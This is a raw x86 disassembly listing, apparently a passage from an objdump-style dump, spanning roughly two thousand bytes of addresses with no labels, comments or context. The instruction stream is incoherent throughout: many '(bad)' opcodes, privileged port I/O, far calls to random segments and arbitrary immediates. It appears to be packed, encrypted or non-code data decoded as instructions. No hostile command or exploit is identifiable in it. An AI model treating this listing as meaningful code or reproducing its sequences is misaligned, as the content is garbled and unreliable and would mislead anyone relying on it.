  406fb7:	jle    0x406f54
  406fb9:	(bad)  
  406fba:	xor    edx,DWORD PTR [ebx-0x665bd8d7]
  406fc0:	into   
  406fc1:	(bad)  
  406fc2:	xor    bl,BYTE PTR [ebx-0x37]
  406fc5:	or     ch,BYTE PTR [edx]
  406fc7:	ins    DWORD PTR es:[edi],dx
  406fc8:	cs test eax,0x330357e5
  406fce:	and    ebx,DWORD PTR [ebp+0x59]
  406fd1:	pop    ds
  406fd2:	push   ss
  406fd3:	test   BYTE PTR [ebx],cl
  406fd5:	sahf   
  406fd6:	iret   
  406fd7:	mov    cs:0xa2d3a48b,eax
  406fdd:	mov    ecx,0xef5c3e1e
  406fe2:	test   eax,0xc33f8cb8
  406fe7:	dec    esp
  406fe8:	dec    ebp
  406fe9:	icebp  
  406fea:	in     eax,0x5f
  406fec:	and    dh,BYTE PTR [edi]
  406fee:	and    DWORD PTR fs:[eax+0x7e],esi
  406ff2:	les    ebp,FWORD PTR [esi-0x3fa240ae]
  406ff8:	jmp    0xa4c3:0x8d4dd7bc
  406fff:	jmp    0xf09ac871
  407004:	fdivr  DWORD PTR [edx+eiz*4-0x2fed57b1]
  40700b:	aas    
  40700c:	pop    edx
  40700d:	test   eax,0xae3552e5
  407012:	sbb    eax,0xa752ee12
  407017:	rcl    BYTE PTR [eax+0x44ef2df9],0xd3
  40701e:	inc    ebp
  40701f:	ds adc cl,dl
  407022:	and    eax,0xf47861
  407027:	inc    edi
  407028:	mov    DWORD PTR [edi+0x5e],ebx
  40702b:	(bad)  
  40702c:	jmp    0x40700b
  40702e:	dec    esp
  40702f:	cdq    
  407030:	clc    
  407031:	stc    
  407032:	or     ebx,esp
  407034:	cli    
  407035:	(bad)  
  407036:	aam    0x34
  407038:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407039:	ja     0x407005
  40703b:	mov    eax,DWORD PTR [edx-0x3e1af33d]
  407041:	add    eax,0x79a53329
  407046:	pop    ss
  407047:	or     BYTE PTR [edx+0x34],0xf4
  40704b:	dec    ebp
  40704c:	push   ebp
  40704d:	mov    ah,0x53
  40704f:	mov    DWORD PTR [esi-0x4f6a8938],edx
  407055:	ds ret 0x2ed9
  407059:	mov    bl,0x33
  40705b:	lahf   
  40705c:	sbb    ah,dh
  40705e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40705f:	xchg   esp,eax
  407060:	call   0xd5bc:0x64481118
  407067:	shr    esi,1
  407069:	mov    al,0xa8
  40706b:	fist   DWORD PTR [edi+0x23355bec]
  407071:	jo     0x4070df
  407073:	and    al,0x61
  407075:	test   BYTE PTR [esi+ecx*1],bh
  407078:	rcl    ch,cl
  40707a:	outs   dx,DWORD PTR ds:[esi]
  40707b:	push   esp
  40707c:	xor    DWORD PTR [edi],esp
  40707e:	mov    ch,0xe6
  407080:	sub    DWORD PTR [edi-0x30],ebx
  407083:	cmp    bl,BYTE PTR ss:[ecx]
  407086:	call   0x3715:0xd02afd68
  40708d:	cmc    
  40708e:	cmc    
  40708f:	pushf  
  407090:	xor    dl,BYTE PTR [ebp-0x2239ae01]
  407096:	mov    ds:0xa62f077,al
  40709b:	test   DWORD PTR [eax],esp
  40709d:	cmp    bh,cl
  40709f:	mov    edx,0x47934829
  4070a4:	inc    ebx
  4070a5:	mov    bl,0x15
  4070a7:	adc    edx,DWORD PTR [ecx-0x5ea0a505]
  4070ad:	call   FWORD PTR [ebx]
  4070af:	jg     0x40710f
  4070b1:	cmp    DWORD PTR [ebp-0x6ce5bf31],edi
  4070b7:	dec    edi
  4070b8:	fisubr DWORD PTR [ebx+ebp*1+0x3d]
  4070bc:	mov    ch,0x57
  4070be:	test   BYTE PTR [esi],dl
  4070c0:	pop    eax
  4070c1:	sbb    DWORD PTR [ebp+0x48],esi
  4070c4:	add    al,0x26
  4070c6:	imul   ebp,DWORD PTR [ecx-0x164341f1],0xb903fde6
  4070d0:	imul   ebx,DWORD PTR [ecx],0x0
  4070d3:	sub    eax,0x3ed10761
  4070d8:	call   FWORD PTR [edx]
  4070da:	sbb    DWORD PTR [eax-0x43868a15],ebp
  4070e0:	mov    eax,ds:0x1ffbb61b
  4070e5:	mov    ch,0x5e
  4070e7:	dec    ebx
  4070e8:	jo     0x4070d3
  4070ea:	push   cs
  4070eb:	call   0x3b601da0
  4070f0:	jmp    0x8e4ac949
  4070f5:	test   DWORD PTR ds:[ebx+0x3ef1ba1c],edx
  4070fc:	pop    ebx
  4070fd:	in     al,dx
  4070fe:	cwde   
  4070ff:	push   ss
  407100:	xchg   ebx,eax
  407101:	stos   BYTE PTR es:[edi],al
  407102:	sahf   
  407103:	mov    DWORD PTR [esi],edx
  407105:	xchg   esp,eax
  407106:	popa   
  407107:	sub    eax,0x9dc8820b
  40710c:	mov    dh,0xa6
  40710e:	xchg   ebp,eax
  40710f:	out    0x31,al
  407111:	addr16 out dx,eax
  407113:	push   ds
  407114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407115:	xchg   ebp,eax
  407116:	jbe    0x4070b3
  407118:	lds    eax,FWORD PTR [ebx]
  40711a:	fstp   DWORD PTR [ebx]
  40711c:	call   0x7ba8:0x3c5b5b9f
  407123:	fistp  WORD PTR [ebx]
  407125:	ins    DWORD PTR es:[edi],dx
  407126:	jmp    0x2f828
  40712b:	adc    edi,DWORD PTR [eax]
  40712d:	test   DWORD PTR [esi-0x2ba30330],ebp
  407133:	inc    edi
  407134:	fwait
  407135:	ins    BYTE PTR es:[edi],dx
  407136:	jmp    0x407151
  407138:	mov    ch,0x5a
  40713a:	fst    QWORD PTR [eax+0x2]
  40713d:	psubsb mm0,QWORD PTR [ecx+0x7aa2c526]
  407144:	push   esi
  407145:	pushf  
  407146:	les    edi,FWORD PTR [edi+0xc]
  407149:	xlat   BYTE PTR ds:[ebx]
  40714a:	mov    bh,0xa0
  40714c:	das    
  40714d:	push   0x48
  40714f:	dec    ecx
  407150:	aaa    
  407151:	sahf   
  407152:	sahf   
  407153:	test   ecx,edi
  407155:	les    eax,FWORD PTR [ebx+0x3f0b0223]
  40715b:	out    dx,eax
  40715c:	(bad)  
  40715d:	jae    0x40717a
  40715f:	mov    ecx,0x75832114
  407164:	sbb    edi,DWORD PTR [esi]
  407166:	add    ah,BYTE PTR [ebx-0x25ddc15c]
  40716c:	push   ds
  40716d:	xchg   edi,eax
  40716e:	push   ecx
  40716f:	mov    bl,0x5f
  407171:	dec    ebx
  407172:	pop    edx
  407173:	push   ebp
  407174:	dec    edx
  407175:	inc    eax
  407176:	xor    ecx,eax
  407178:	adc    cl,BYTE PTR [edx]
  40717a:	jbe    0x4071bc
  40717c:	xor    BYTE PTR [ecx+0xf9d854f],ch
  407182:	lods   eax,DWORD PTR ds:[esi]
  407183:	push   edx
  407184:	int3   
  407185:	jae    0x4071f6
  407187:	lock pop esi
  407189:	sbb    edi,DWORD PTR [ebp-0x62c74146]
  40718f:	sbb    ecx,DWORD PTR [ecx+eax*1+0x1ef0453a]
  407196:	mov    al,0x79
  407198:	mov    edi,0xcfe405e7
  40719d:	jl     0x407154
  40719f:	push   ebp
  4071a0:	xchg   edi,eax
  4071a1:	jl     0x4071bf
  4071a3:	mov    esi,0x36e0ce11
  4071a8:	push   edx
  4071a9:	imul   esi,DWORD PTR [eax-0x46],0x8b638d7d
  4071b0:	sbb    al,0x95
  4071b2:	inc    ebp
  4071b3:	imul   edx,DWORD PTR [edx+0x70],0xe997156f
  4071ba:	call   0xd390:0x154e20a2
  4071c1:	ins    DWORD PTR es:[edi],dx
  4071c2:	sub    esp,esp
  4071c4:	jnp    0x40715e
  4071c6:	sub    bl,bh
  4071c8:	test   DWORD PTR [edx+0x7d7db767],edx
  4071ce:	call   0xb442:0x78e0702
  4071d5:	sahf   
  4071d6:	inc    ebx
  4071d7:	sar    ecx,cl
  4071d9:	adc    al,0xe5
  4071db:	adc    edx,DWORD PTR [eax]
  4071dd:	xor    DWORD PTR [edx+eax*4-0x6e],0x3
  4071e2:	mov    DWORD PTR [edi+0x7e],eax
  4071e5:	cmp    DWORD PTR [eax-0xd54bd64],edi
  4071eb:	mov    dh,0x19
  4071ed:	mov    eax,DWORD PTR ds:0x1cca7e9f
  4071f3:	pushf  
  4071f4:	mov    cl,0x89
  4071f6:	arpl   WORD PTR [edx],di
  4071f8:	mov    edi,0x55cb16c8
  4071fd:	inc    esi
  4071fe:	gs jno 0x4071e1
  407201:	and    dl,BYTE PTR [esi]
  407203:	sub    ebx,DWORD PTR [esi+0x11f57d64]
  407209:	mov    edi,0x6982c9fb
  40720e:	ins    DWORD PTR es:[edi],dx
  40720f:	aaa    
  407210:	neg    DWORD PTR es:[esi]
  407213:	inc    ecx
  407214:	xchg   BYTE PTR [edx+0x4d158f1d],cl
  40721a:	cmp    esp,DWORD PTR [ebx-0x26e9a057]
  407220:	jmp    0x4616:0x6a693e0c
  407227:	fs push esi
  407229:	dec    eax
  40722a:	call   0xc7d2:0x34beff00
  407231:	push   0x2
  407233:	ss adc eax,0x8180ee95
  407239:	and    BYTE PTR [eax+0xc7f0bda],dl
  40723f:	push   0x1151aee1
  407244:	mov    al,ds:0x95269fa1
  407249:	loope  0x4072c2
  40724b:	clc    
  40724c:	into   
  40724d:	xor    edx,ebp
  40724f:	pop    ebp
  407250:	jge    0x4071df
  407252:	pop    ds
  407253:	cmp    edx,esp
  407255:	sar    BYTE PTR [ecx-0x48],0xe1
  407259:	adc    DWORD PTR [edi+edx*2],esi
  40725c:	mov    dl,0x8c
  40725e:	aad    0x82
  407260:	in     al,0x91
  407262:	mov    al,ds:0xc04e7d70
  407267:	ret    0x6ea5
  40726a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40726b:	leave  
  40726c:	cli    
  40726d:	dec    esi
  40726e:	out    dx,al
  40726f:	and    DWORD PTR [ebx+ecx*8],0xee5eea88
  407276:	cdq    
  407277:	jl     0x407291
  407279:	inc    edx
  40727a:	inc    ecx
  40727b:	jne    0x40720a
  40727d:	cld    
  40727e:	(bad)  
  407280:	jb     0x407244
  407282:	mov    eax,0x9df54e65
  407287:	push   edi
  407288:	sbb    ch,dl
  40728a:	stos   BYTE PTR es:[edi],al
  40728b:	ss mov ch,0xf2
  40728e:	aaa    
  40728f:	out    dx,eax
  407290:	(bad)  
  407291:	cld    
  407292:	fdivr  QWORD PTR [ecx+0x5c3198c]
  407298:	xchg   edx,eax
  407299:	xchg   ebx,eax
  40729a:	and    DWORD PTR [ebx-0x64325917],eax
  4072a0:	imul   eax,DWORD PTR [eax],0xffffff82
  4072a3:	call   0x2d4350b8
  4072a8:	in     eax,0x4a
  4072aa:	data16 xor BYTE PTR [esi+0x28],dh
  4072ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072af:	mov    DWORD PTR [esi-0x29f7ce5],0x69c73f63
  4072b9:	lods   eax,DWORD PTR ds:[esi]
  4072ba:	outs   dx,BYTE PTR ds:[esi]
  4072bb:	sub    ebp,eax
  4072bd:	dec    ecx
  4072be:	retf   
  4072bf:	push   0x81bd8d7c
  4072c4:	fcmovne st,st(6)
  4072c6:	jae    0x407339
  4072c8:	push   eax
  4072c9:	sar    al,cl
  4072cb:	lods   eax,DWORD PTR ds:[esi]
  4072cc:	cdq    
  4072cd:	loopne 0x4072bf
  4072cf:	lahf   
  4072d0:	fwait
  4072d1:	add    al,0xb6
  4072d3:	retf   
  4072d4:	popa   
  4072d5:	sub    DWORD PTR gs:[edx+0x139c2096],edx
  4072dc:	xchg   esp,eax
  4072dd:	cmp    bh,BYTE PTR [esi+0x44]
  4072e0:	in     eax,0x9e
  4072e2:	mov    ebp,0xf00ae1fe
  4072e7:	es mov edx,0x101a1e9b
  4072ed:	mov    eax,ds:0xe1efceb0
  4072f2:	fwait
  4072f3:	int    0x10
  4072f5:	stos   DWORD PTR es:[edi],eax
  4072f6:	shl    BYTE PTR [ecx],0xb1
  4072f9:	push   es
  4072fa:	push   ds
  4072fb:	std    
  4072fc:	xchg   edx,eax
  4072fd:	aas    
  4072fe:	jl     0x407371
  407300:	cli    
  407301:	int    0x3b
  407303:	sbb    eax,0x7169f122
  407308:	cdq    
  407309:	mov    ebx,0xfbf03274
  40730e:	mov    al,ds:0xe9f7066b
  407313:	xchg   bl,cl
  407315:	or     DWORD PTR [edx+0x16],0xfffffff9
  407319:	stc    
  40731a:	enter  0xf154,0x62
  40731e:	cmp    DWORD PTR [esi-0x7d25576],edx
  407324:	add    edx,esp
  407326:	fsubr  st,st(1)
  407328:	inc    ebp
  407329:	mov    esp,0xaeb2713
  40732e:	shl    DWORD PTR [edi+0x5ee98cb6],1
  407334:	popa   
  407335:	arpl   WORD PTR [edx],sp
  407337:	sbb    al,0x5
  407339:	ret    0x847
  40733c:	sbb    al,0x30
  40733e:	or     BYTE PTR [edx+0x12680d10],0xf
  407345:	cmc    
  407346:	call   DWORD PTR [edi]
  407348:	test   esi,esi
  40734a:	add    ah,BYTE PTR ds:[ecx]
  40734d:	mov    edx,0xd4bbec32
  407352:	call   0x1cdcdaf1
  407357:	inc    esp
  407358:	das    
  407359:	xchg   esp,eax
  40735a:	mov    ah,0x42
  40735c:	inc    ebx
  40735d:	imul   esi,DWORD PTR ds:0xff7a70b6,0xffffffb3
  407364:	push   esi
  407365:	cmp    esi,ecx
  407367:	add    al,0x3b
  407369:	xchg   esi,eax
  40736a:	outs   dx,DWORD PTR ds:[esi]
  40736b:	(bad)  [ebx+eiz*2]
  40736e:	aaa    
  40736f:	enter  0x1db2,0xb8
  407373:	lea    edi,[ebp-0x3a9b492a]
  407379:	xchg   edx,eax
  40737a:	xchg   edi,eax
  40737b:	rcr    DWORD PTR [ebp+0x56e823a8],cl
  407381:	mov    edx,0x8cb66748
  407386:	stc    
  407387:	jl     0x407400
  407389:	retf   
  40738a:	leave  
  40738b:	cmp    DWORD PTR [edi-0x4e],ebp
  40738e:	xor    al,0x7a
  407390:	mov    al,ds:0x74c0a732
  407395:	aas    
  407396:	sbb    bl,BYTE PTR [edi+ebp*1]
  407399:	add    BYTE PTR [esi-0x2],dl
  40739c:	retf   
  40739d:	dec    esi
  40739e:	loop   0x407367
  4073a0:	dec    esi
  4073a1:	fiadd  DWORD PTR [ebp+0x62]
  4073a4:	in     al,0x9c
  4073a6:	jb     0x407414
  4073a8:	in     eax,dx
  4073a9:	popa   
  4073aa:	and    BYTE PTR [edi-0x3c],bl
  4073ad:	add    al,0x14
  4073af:	popa   
  4073b0:	adc    bl,BYTE PTR [esi]
  4073b2:	jno    0x40735c
  4073b4:	or     edx,DWORD PTR [ecx-0x3cfd0961]
  4073ba:	lea    edx,[eax]
  4073bc:	mov    dl,0xd5
  4073be:	call   0x94470269
  4073c3:	jo     0x4073d8
  4073c5:	sub    eax,0x6a6a6926
  4073ca:	shl    ebp,1
  4073cc:	test   eax,0x8131bfc5
  4073d1:	pop    esp
  4073d2:	cmp    eax,0xb4c3268b
  4073d7:	retf   0xb0a
  4073da:	arpl   WORD PTR [ebx],ax
  4073dc:	mov    al,0xb3
  4073de:	leave  
  4073df:	pushf  
  4073e0:	inc    ecx
  4073e1:	imul   edx,DWORD PTR [esi-0x20],0xffffffe5
  4073e5:	addr16 dec ebp
  4073e7:	mov    ebp,0x7c4c3c57
  4073ec:	dec    si
  4073ee:	xchg   edx,eax
  4073ef:	not    BYTE PTR es:[ecx-0x31]
  4073f3:	xor    DWORD PTR [esi-0x26f447fd],eax
  4073f9:	ror    BYTE PTR [ebx-0x35],cl
  4073fc:	add    BYTE PTR [ecx+0x2ad11efa],0x35
  407403:	mov    ds:0xbbcbd1dc,al
  407408:	push   ebp
  407409:	xlat   BYTE PTR ds:[ebx]
  40740a:	push   ecx
  40740b:	popa   
  40740c:	bound  edx,QWORD PTR [edx+0x73]
  40740f:	xchg   esi,eax
  407410:	xor    DWORD PTR [eax-0x4f],esp
  407413:	mov    ebx,0x7d9e59a6
  407418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407419:	jmp    0xc78d0d3
  40741e:	and    bh,dl
  407420:	aaa    
  407421:	xchg   ecx,eax
  407422:	cmp    DWORD PTR [esi-0x1d],ebx
  407425:	sbb    DWORD PTR [ebx+0x614dc7bd],edx
  40742b:	mov    edx,0xfba321b9
  407430:	or     DWORD PTR [ecx],esp
  407432:	repz jg 0x40747c
  407435:	loope  0x407438
  407437:	mov    WORD PTR [edi],es
  407439:	pop    edi
  40743a:	js     0x407469
  40743c:	popf   
  40743d:	(bad)  
  40743e:	cmp    ebp,ecx
  407440:	pusha  
  407441:	pushf  
  407442:	sbb    eax,esi
  407444:	int3   
  407445:	mov    ch,0xb9
  407447:	repz and BYTE PTR [esi+0x4],dh
  40744b:	retf   0x4136
  40744e:	push   esp
  40744f:	and    al,0x14
  407451:	std    
  407452:	psllq  mm1,QWORD PTR [ebp+0x71]
  407456:	arpl   si,sp
  407458:	mov    ch,0xcf
  40745a:	push   es
  40745b:	stos   DWORD PTR es:[edi],eax
  40745c:	push   ecx
  40745d:	shl    DWORD PTR [ebp-0x7faa3e0b],0xae
  407464:	(bad)  
  407465:	pop    ds
  407466:	mov    bl,BYTE PTR [edi]
  407468:	fcmovnbe st,st(2)
  40746a:	cmp    esp,ebp
  40746c:	enter  0xbb12,0x51
  407470:	out    0xed,al
  407472:	(bad)  
  407473:	push   esi
  407474:	ss pop edx
  407476:	push   eax
  407477:	into   
  407478:	push   ebp
  407479:	sti    
  40747a:	xchg   ebx,eax
  40747b:	je     0x407444
  40747d:	pusha  
  40747e:	mov    bl,0xd
  407480:	(bad)  
  407482:	inc    edi
  407483:	pop    ebp
  407484:	mov    ebx,0x4d1b0c2a
  407489:	adc    BYTE PTR [edi+ebp*2],cl
  40748c:	repnz push ss
  40748e:	mov    esi,0xe45c71bc
  407493:	mov    dh,0xa9
  407495:	data16 fst QWORD PTR ds:0x2d30b82
  40749c:	cmp    dh,ch
  40749e:	outs   dx,DWORD PTR ds:[esi]
  40749f:	mov    edi,0x64fffeb2
  4074a4:	call   0x8829:0xc878eef0
  4074ab:	pop    edx
  4074ac:	inc    esi
  4074ad:	das    
  4074ae:	inc    esp
  4074af:	push   cs
  4074b0:	add    al,0xc3
  4074b2:	mov    DWORD PTR [edi+0x34ce0ce3],eax
  4074b8:	(bad)  
  4074b9:	hlt    
  4074ba:	pop    es
  4074bb:	call   0x884:0xd5378b26
  4074c2:	dec    ecx
  4074c3:	pop    esp
  4074c4:	mul    edx
  4074c6:	loopne 0x407513
  4074c8:	fs retf 0x1c1e
  4074cc:	inc    edi
  4074cd:	into   
  4074ce:	lock xor al,0x26
  4074d1:	mov    ch,0xc3
  4074d3:	push   ecx
  4074d4:	push   0xf025a3d8
  4074d9:	pop    ds
  4074da:	xor    ch,BYTE PTR [esi]
  4074dc:	mov    edx,edi
  4074de:	jmp    0xf9e3733c
  4074e3:	sbb    al,0xa0
  4074e5:	je     0x40749e
  4074e7:	jbe    0x4074c7
  4074e9:	inc    esi
  4074ea:	sub    BYTE PTR [ecx+0x2a12118c],cl
  4074f0:	ret    
  4074f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074f2:	lds    ebx,FWORD PTR [esi-0x3b]
  4074f5:	xchg   edx,eax
  4074f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074f7:	mul    BYTE PTR [edx]
  4074f9:	cld    
  4074fa:	mov    DWORD PTR [eax],esp
  4074fc:	add    al,0xfb
  4074fe:	cmp    bh,BYTE PTR [esi+0x7e319c8]
  407504:	mov    edi,gs
  407506:	popf   
  407507:	loope  0x407579
  407509:	xchg   ebp,eax
  40750a:	pop    es
  40750b:	cmp    al,0x42
  40750d:	inc    esp
  40750e:	jns    0x4074dd
  407510:	(bad)  
  407512:	es sahf 
  407514:	xchg   ebp,eax
  407515:	xor    al,0xce
  407517:	dec    edx
  407518:	inc    edi
  407519:	das    
  40751a:	jae    0x407509
  40751c:	cli    
  40751d:	pop    ss
  40751e:	sbb    bh,BYTE PTR [esi+0x6f]
  407521:	cs pop esp
  407523:	cmp    eax,0xe36aaa07
  407528:	inc    ebx
  407529:	and    esi,DWORD PTR [edx-0x62225f7b]
  40752f:	adc    al,0xc8
  407531:	xor    BYTE PTR [edi+0x3e17bf7d],0xd5
  407538:	jmp    0x328ce5fb
  40753d:	cmc    
  40753e:	inc    ebp
  40753f:	pop    edx
  407540:	lods   eax,DWORD PTR ds:[esi]
  407541:	jnp    0x407574
  407543:	sub    eax,0xffffffbd
  407546:	add    BYTE PTR [edi-0x6ea0cbcb],bl
  40754c:	test   al,0xd3
  40754e:	imul   ebx,DWORD PTR [eax+0x67d082ee],0xffffffc0
  407555:	pop    ebx
  407556:	loope  0x40752a
  407558:	push   eax
  407559:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40755b:	scas   al,BYTE PTR es:[edi]
  40755c:	icebp  
  40755d:	mov    ds:0x1dbdef52,eax
  407562:	add    ebx,DWORD PTR [ecx+esi*2-0x6adc7708]
  407569:	mov    edx,0xf2dc13c5
  40756e:	cmp    BYTE PTR [esi+0x5d],al
  407571:	daa    
  407572:	cmp    eax,esi
  407574:	iret   
  407575:	pop    ds
  407576:	repz call 0xebc08b2e
  40757c:	sbb    DWORD PTR [edi-0x2f],0x2
  407580:	pushf  
  407581:	(bad)  
  407582:	pop    edx
  407583:	xchg   DWORD PTR [eax+0x724315e1],ecx
  407589:	mov    al,0x38
  40758b:	sub    dh,BYTE PTR ds:0xfff8a642
  407591:	push   edx
  407592:	test   DWORD PTR [eax],edx
  407594:	gs mov dl,0xce
  407597:	sub    BYTE PTR [eax+0x5a],cl
  40759a:	xlat   BYTE PTR ds:[ebx]
  40759b:	sub    BYTE PTR [ecx],dl
  40759d:	in     eax,0xeb
  40759f:	inc    ebx
  4075a0:	out    0x7f,eax
  4075a2:	jne    0x407541
  4075a4:	out    0x62,al
  4075a6:	or     eax,0x98feb06d
  4075ab:	jae    0x407553
  4075ad:	dec    eax
  4075ae:	sti    
  4075af:	push   ebx
  4075b0:	push   cs
  4075b1:	add    ch,BYTE PTR [ebp-0x773a8c90]
  4075b7:	out    0x92,al
  4075b9:	xor    dl,dl
  4075bb:	mov    ah,0x1
  4075bd:	jno    0x407552
  4075bf:	mov    esi,0xdf98f58f
  4075c4:	adc    esi,esi
  4075c6:	pop    ebp
  4075c7:	inc    ebp
  4075c8:	add    BYTE PTR [ebp-0x2edc0eb7],dh
  4075ce:	fld    DWORD PTR [esi-0x5e710e36]
  4075d4:	push   ebx
  4075d5:	call   0xec5967f4
  4075da:	mov    esp,0x7ef889e
  4075df:	xor    ch,BYTE PTR [esi+eax*1+0x46209443]
  4075e6:	adc    bh,cl
  4075e8:	add    BYTE PTR [ecx+eax*4+0x1377855f],ch
  4075ef:	mov    esp,0xa1bdbf84
  4075f4:	retf   0xafba
  4075f7:	jns    0x407592
  4075f9:	and    DWORD PTR [edx],ebp
  4075fb:	fcmovnb st,st(3)
  4075fd:	adc    edi,DWORD PTR [edi]
  4075ff:	dec    esp
  407600:	sub    ch,ch
  407602:	repnz fs rcl dh,0x6f
  407607:	ror    BYTE PTR [edi+0x67],1
  40760a:	outs   dx,DWORD PTR ds:[esi]
  40760b:	add    DWORD PTR [ebx-0x5c],esp
  40760e:	dec    ebp
  40760f:	add    al,0x8e
  407611:	adc    eax,0x802213f0
  407616:	xor    al,BYTE PTR [ebx]
  407618:	push   0x8cb23583
  40761d:	neg    eax
  40761f:	inc    edi
  407620:	(bad)
  407623:	fsubr  QWORD PTR [esi]
  407625:	jne    0x4075d8
  407627:	pop    edx
  407628:	sbb    eax,0x5d159682
  40762d:	xor    al,0xd1
  40762f:	sub    al,0xf6
  407631:	dec    ebx
  407632:	loope  0x4075f3
  407634:	mov    eax,0x14fa5f6c
  407639:	or     al,0xf5
  40763b:	push   0x853659d5
  407640:	jnp    0x4075ce
  407642:	cmc    
  407643:	aad    0x4d
  407645:	stc    
  407646:	fs sub dl,dh
  407649:	les    esp,FWORD PTR [edx-0x23eb756f]
  40764f:	adc    al,BYTE PTR [edx-0xd]
  407652:	push   edx
  407653:	mov    ds:0xd9d58a8,al
  407658:	lods   al,BYTE PTR ds:[esi]
  407659:	es pop ebp
  40765b:	es aas 
  40765d:	loop   0x4076cc
  40765f:	xor    ch,ch
  407661:	es mov esi,0x46baf0d5
  407667:	out    0xdd,eax
  407669:	pushf  
  40766a:	test   al,0xec
  40766c:	aas    
  40766d:	iret   
  40766e:	cmp    ch,ch
  407670:	adc    BYTE PTR [ecx-0x33e68c09],ch
  407676:	or     BYTE PTR cs:[edx],dh
  407679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40767a:	jno    0x4076e4
  40767c:	fsub   st(6),st
  40767e:	xchg   esp,edx
  407680:	fisub  WORD PTR [ecx-0x68]
  407683:	mov    ch,dl
  407685:	shr    DWORD PTR [edi+0x2cf8e534],cl
  40768b:	mov    al,ds:0x8f2fa19f
  407690:	pop    ebx
  407691:	mov    bh,dl
  407693:	xlat   BYTE PTR ds:[ebx]
  407694:	xor    BYTE PTR [eax],al
  407696:	retf   0xc527
  407699:	and    eax,0xd6514a9e
  40769e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40769f:	push   ss
  4076a0:	mov    edi,0xa28d940d
  4076a6:	xor    ebp,DWORD PTR [ecx-0x6]
  4076a9:	jno    0x4076d7
  4076ab:	rol    BYTE PTR [edx+0x62],0x57
  4076af:	xor    edi,DWORD PTR [ecx]
  4076b1:	or     ebx,DWORD PTR [ecx]
  4076b3:	pop    ss
  4076b4:	in     eax,0xae
  4076b6:	daa    
  4076b7:	xchg   bh,bl
  4076b9:	lock jns 0x4076dc
  4076bc:	leave  
  4076bd:	(bad)  
  4076be:	aad    0x5b
  4076c0:	mov    WORD PTR [di+0x758b],es
  4076c5:	stos   BYTE PTR es:[edi],al
  4076c6:	cld    
  4076c7:	mov    ah,0x6c
  4076c9:	push   cs
  4076ca:	pop    edx
  4076cb:	ja     0x407734
  4076cd:	out    dx,eax
  4076ce:	mov    ebp,ss
  4076d0:	xchg   edx,eax
  4076d1:	xor    dl,ch
  4076d3:	xlat   BYTE PTR ds:[ebx]
  4076d4:	test   DWORD PTR [ebp-0x469fb16f],ecx
  4076da:	and    al,0x4
  4076dc:	lods   eax,DWORD PTR ds:[esi]
  4076dd:	fcmovu st,st(6)
  4076df:	add    al,0xf5
  4076e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076e2:	sub    al,0xc2
  4076e4:	push   ecx
  4076e5:	push   edi
  4076e6:	jmp    0x25333e97
  4076eb:	xor    al,0x83
  4076ed:	fcmovne st,st(1)
  4076ef:	repnz lods al,BYTE PTR ds:[esi]
  4076f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076f2:	test   eax,0x6e5c7142
  4076f7:	cmovne ebx,DWORD PTR [ebx+0x4b2d0e5]
  4076fe:	into   
  4076ff:	test   BYTE PTR [edx],0xf2
  407702:	add    al,0x4b
  407704:	mov    ah,0x88
  407706:	adc    eax,0xf4599ecb
  40770b:	mov    bh,0x1b
  40770d:	call   0x40e0184e
  407712:	lods   eax,DWORD PTR ds:[esi]
  407713:	iret   
  407714:	in     al,0xab
  407716:	mov    cl,BYTE PTR fs:[esi]
  407719:	ins    BYTE PTR es:[edi],dx
  40771a:	sub    BYTE PTR [ecx],dl
  40771c:	dec    edx
  40771d:	(bad)  
  40771e:	cli    
  40771f:	jl     0x407726
  407721:	(bad)  
  407722:	in     eax,0x61
  407724:	lea    esp,[esp+ebx*4+0x1c6ec617]
  40772b:	sub    DWORD PTR [esi+0x3387d1fe],ecx
  407731:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407732:	xchg   edi,eax
  407733:	iret   
  407734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407735:	in     eax,0x17
  407737:	push   ebx
  407738:	push   ds
  407739:	mov    bl,0xe7
  40773b:	ins    BYTE PTR es:[edi],dx
  40773c:	cdq    
  40773d:	gs dec ebx
  40773f:	xor    bl,al
  407741:	sbb    eax,0x50ad1aed
  407746:	mov    ecx,0xad854137
  40774b:	or     BYTE PTR [ecx+ebx*2-0x2d8756d2],ch
  407752:	sahf   
  407753:	jl     0x4077aa
  407755:	mov    bh,0x7f
  407757:	cld    
  407758:	xchg   ebp,eax
  407759:	add    DWORD PTR [edx],ebp
  40775b:	rcr    BYTE PTR [edi],1
  40775d:	jns    0x4077d9
  40775f:	in     al,dx
  407760:	mov    bh,0xc1
  407762:	call   0x3e7bdf70
  407767:	daa    
  407768:	mov    esp,0x5eb4e0bf
  40776d:	in     eax,0x30
  40776f:	in     al,dx
  407770:	ror    edx,0x89
  407773:	ret    
  407774:	mov    gs,WORD PTR [edi-0xe5fe3e6]
  40777a:	add    edx,ecx
  40777c:	mov    eax,ds:0x610c314
  407781:	dec    ecx
  407782:	leave  
  407783:	add    DWORD PTR [edx+0x6ac25a36],ecx
  407789:	in     al,0xbc
  40778b:	push   edi
  40778c:	ins    DWORD PTR es:[edi],dx
  40778d:	std    
  40778e:	jbe    0x40777e
  407790:	jg     0x4077e4
  407792:	in     al,0xd0
  407794:	jmp    0x40779d
  407796:	je     0x40779f
  407798:	sbb    DWORD PTR [ebp-0x51e8f74f],edi
  40779e:	je     0x407759
  4077a0:	int    0x3
  4077a2:	pop    esi
  4077a3:	sub    DWORD PTR [edx-0x68],ebp
  4077a6:	lahf   
  4077a7:	sub    ecx,DWORD PTR ds:0x7fa83d4c
  4077ad:	aas    
  4077ae:	jbe    0x407793
  4077b0:	dec    ecx
  4077b1:	repz popa 
  4077b3:	imul   edi,ecx,0xffffff8d
  4077b6:	cli    
